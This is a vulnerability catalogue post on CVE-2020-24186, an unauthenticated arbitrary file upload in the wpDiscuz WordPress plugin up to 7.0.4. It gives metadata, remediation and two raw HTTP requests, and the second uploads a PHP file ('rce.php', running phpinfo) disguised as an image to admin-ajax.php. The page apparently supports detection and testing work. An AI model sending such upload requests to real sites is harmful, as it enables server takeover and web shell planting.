---
layout: post
cve_id: CVE-2020-24186
title: WordPress wpDiscuz <=7.0.4 - Remote Code Execution
pcap: true
pcap_path: /pcaps/2020/CVE-2020-24186.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2020/CVE-2020-24186.yaml
snort2_rule: N/A
snort3_rule: N/A
author: Ganofins
severity: critical
impact: 'Successful exploitation of this vulnerability can lead to arbitrary code
  execution on the affected WordPress site.

  '
remediation: 'Update the wpDiscuz plugin to the latest version (>=7.0.5) to mitigate
  this vulnerability.

  '
reference:
- https://github.com/suncsr/wpDiscuz_unauthenticated_arbitrary_file_upload/blob/main/README.md
- https://nvd.nist.gov/vuln/detail/CVE-2020-24186
- https://www.wordfence.com/blog/2020/07/critical-arbitrary-file-upload-vulnerability-patched-in-wpdiscuz-plugin/
- http://packetstormsecurity.com/files/162983/WordPress-wpDiscuz-7.0.4-Shell-Upload.html
- https://github.com/ARPSyndicate/cvemon
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
  cvss-score: 10
  cve-id: CVE-2020-24186
  cwe-id: CWE-434
  epss-score: 0.94213
  epss-percentile: 0.99918
  cpe: cpe:2.3:a:gvectors:wpdiscuz:*:*:*:*:*:wordpress:*:*
metadata:
  max-request: 2
  vendor: gvectors
  product: wpdiscuz
  framework: wordpress
tags:
- cve
- cve2020
- rce
- fileupload
- packetstorm
- wordpress
- wp-plugin
- intrusive
- gvectors
- vuln
---

## ðŸ” Vulnerability Description
WordPress wpDiscuz plugin versions  version 7.0 through 7.0.4 are susceptible to remote code execution. This flaw gave unauthenticated attackers the ability to upload arbitrary files, including PHP files, and achieve remote code execution on a vulnerable site's server.

## ðŸŒ HTTP Request
```nohighlight
GET /?p=1 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Connection: close
Accept: */*
Accept-Encoding: gzip
```

```nohighlight
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15
Connection: close
Content-Length: 693
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary88AhjLimsDMHU1Ak
Origin: http://www.victim.com
Referer: http://www.victim.com
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

------WebKitFormBoundary88AhjLimsDMHU1Ak
Content-Disposition: form-data; name="action"

wmuUploadFiles
------WebKitFormBoundary88AhjLimsDMHU1Ak
Content-Disposition: form-data; name="wmu_nonce"

Fn7eZd
------WebKitFormBoundary88AhjLimsDMHU1Ak
Content-Disposition: form-data; name="wmuAttachmentsData"

undefined
------WebKitFormBoundary88AhjLimsDMHU1Ak
Content-Disposition: form-data; name="wmu_files[0]"; filename="rce.php"
Content-Type: image/png

ï¿½ï¿½ï¿½ï¿½jExifMM*ï¿½ï¿½ï¿½iï¿½ï¿½>ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½JFIFï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Cï¿½ï¿½ï¿½
ï¿½ï¿½
<?php phpinfo();?>
------WebKitFormBoundary88AhjLimsDMHU1Ak
Content-Disposition: form-data; name="postId"

1
------WebKitFormBoundary88AhjLimsDMHU1Ak--
```

